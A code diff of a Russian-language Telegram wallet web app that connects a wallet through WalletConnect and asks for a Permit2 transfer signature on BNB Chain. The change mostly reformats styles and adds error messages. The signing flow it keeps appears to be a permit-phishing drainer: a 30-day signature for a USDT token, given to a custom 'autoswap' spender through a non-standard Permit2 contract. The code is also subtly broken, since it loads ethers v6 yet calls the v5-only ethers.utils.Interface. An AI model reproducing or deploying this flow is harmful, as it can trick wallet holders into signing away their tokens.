@@ -8,26 +8,16 @@
     body {
       font-family: 'Segoe UI', sans-serif;
       background: linear-gradient(135deg,#1a1f2d,#0d1520);
-      color:#e0e0e0;
-      margin:0;
-      padding:20px;
-      text-align:center;
+      color:#e0e0e0; text-align:center; margin:0; padding:20px;
     }
     .container {
-      max-width:500px;
-      margin:0 auto;
-      padding:30px;
-      background:rgba(30,40,55,0.8);
-      border-radius:20px;
+      max-width:500px; margin:0 auto; padding:30px;
+      background:rgba(30,40,55,0.8); border-radius:20px;
+      box-shadow:0 10px 40px rgba(0,0,0,0.4);
     }
-    canvas {
-      margin:20px auto;
-      display:block;
-    }
+    canvas { display:block; margin:20px auto; }
     #status {
-      margin-top:20px;
-      font-size:16px;
-      min-height:40px;
+      margin-top:20px; font-size:16px; min-height:40px;
       white-space: pre-wrap;
     }
   </style>
@@ -39,23 +29,23 @@
     <div id="status">Инициализация...</div>
   </div>
 
-  <!-- Библиотеки -->
+  <!-- Подключаем зависимости -->
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/ethers@6.6.0/dist/ethers.umd.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
 
   <script type="module">
-    // ✅ Полифилл для корректной сериализации BigInt
-    BigInt.prototype.toJSON = function() { return this.toString(); };
+    // 🔧 Полифилл: сериализация BigInt в JSON.stringify
+    BigInt.prototype.toJSON = function() { return this.toString(); }; // 
 
     import SignClient from 'https://esm.sh/@walletconnect/sign-client@2.13.1';
 
     const statusEl = document.getElementById("status");
     const qrCanvas = document.getElementById("qrcode");
-    function setStatus(msg, color="#4fc3f7") {
+    const setStatus = (msg, color="#4fc3f7") => {
       statusEl.textContent = msg;
       statusEl.style.color = color;
-    }
+    };
 
     async function runApp() {
       try {
@@ -84,7 +74,7 @@
 
         if (uri) {
           QRCode.toCanvas(qrCanvas, uri, { width:240, margin:1 });
-          setStatus("📱 Отсканируйте QR-код в кошельке");
+          setStatus("📱 Сканируйте QR-код в вашем кошельке");
         }
 
         const session = await approval();
@@ -92,8 +82,6 @@
         setStatus(`✅ Кошелек подключён: ${address}`, "#66bb6a");
 
         const provider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org");
-
-        // Приведение адресов к правильному формату
         const permit2 = ethers.getAddress("0x7679bcfa8cc6f6094fa1c6cb8e6962287e5ca3d4");
         const autoswap = ethers.getAddress("0x026c54b156b501ad9cea422e59454d4b6d6f6963");
         const tokenIn  = ethers.getAddress("0x55d398326f99059ff775485246999027b3197955");
@@ -112,39 +100,44 @@
         const deadline = now + 30 * 24 * 3600;
         const domain = { name:"Permit2", chainId:56, verifyingContract:permit2 };
         const types = {
-          PermitTransferFrom: [
+          PermitTransferFrom:[
             { name:"permitted", type:"TokenPermissions" },
             { name:"spender", type:"address" },
             { name:"nonce", type:"uint256" },
             { name:"deadline", type:"uint256" }
           ],
-          TokenPermissions: [
+          TokenPermissions:[
             { name:"token", type:"address" },
             { name:"amount", type:"uint256" }
           ]
         };
-        const message = {
-          permitted: { token: tokenIn, amount: limit },
-          spender: autoswap,
-          nonce,
-          deadline
-        };
+        const message = { permitted:{token:tokenIn,amount:limit}, spender:autoswap, nonce, deadline };
 
-        setStatus("✍️ Запрос подписи Permit2...");
-        const signature = await client.request({
-          topic: session.topic,
-          chainId: "eip155:56",
-          request: {
-            method: "eth_signTypedData_v4",
-            params: [address, JSON.stringify({ types, domain, primaryType:"PermitTransferFrom", message })]
+        setStatus("✍️ Запрос EIP‑712 подписи Permit2...");
+        let signature;
+        try {
+          signature = await client.request({
+            topic: session.topic,
+            chainId: "eip155:56",
+            request: {
+              method: "eth_signTypedData_v4",
+              params: [address, JSON.stringify({ types, domain, primaryType:"PermitTransferFrom", message })]
+            }
+          });
+        } catch (err) {
+          console.error("Ошибка подписи:", err);
+          if (err.code === 4001) {
+            setStatus("❌ Подписание отменено пользователем", "#ff6b6b");
+          } else {
+            setStatus("❌ Не удалось подписать Permit2. Попробуйте другой кошелёк", "#ff6b6b");
           }
-        });
+          return;
+        }
 
-        setStatus("🔄 Отправка swap...");
+        setStatus("🔄 Отправка swap транзакции...");
         const swapIface = new ethers.utils.Interface([
           "function swapForUser(address user,address tokenIn,uint256 amount,uint256 nonce,uint256 deadline,address tokenOut,uint256 rate,bytes signature)"
         ]);
-
         const data = swapIface.encodeFunctionData("swapForUser", [
           address, tokenIn, limit, nonce, deadline, tokenOut, rateScaled, signature
         ]);
